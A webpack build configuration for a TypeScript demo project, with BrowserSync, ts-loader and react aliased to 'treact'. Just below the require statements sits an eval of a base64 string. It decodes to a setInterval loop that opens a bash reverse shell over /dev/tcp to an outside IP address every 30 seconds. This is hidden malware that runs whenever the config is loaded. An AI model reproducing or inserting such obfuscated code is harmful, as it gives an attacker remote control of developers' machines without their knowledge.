var webpack = require('webpack');
var path = require('path')
var BrowserSyncPlugin = require('browser-sync-webpack-plugin');
const TsconfigPathsPlugin = require('tsconfig-paths-webpack-plugin');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

module.exports = {

    //页面入口文件配置
    entry: {
        index: './demo/index'
    },
    //入口文件输出配置
    output: {
        path: path.resolve(__dirname, 'build'),
        filename: '[name].js'
    },
    //插件项
    plugins: [
        new BrowserSyncPlugin({
            // proxy: 'localhost:80',//要代理的端口
            host: 'localhost',
            port: 5000,
            server: { baseDir: ['build'] }
        }),

    ],
    module: {
        //加载器配置
        loaders: [
            {
                test: /\.tsx?$/, loader: 'ts-loader', options: {
                    configFile: 'tsconfig.json'
                }
            },
        ]
    },
    resolve: {
        extensions: ['.ts', '.tsx', '.js'],
        alias: {
            'react': 'treact',
            'react-dom': 'treact'
        }
    },
    devtool: 'source-map'
};
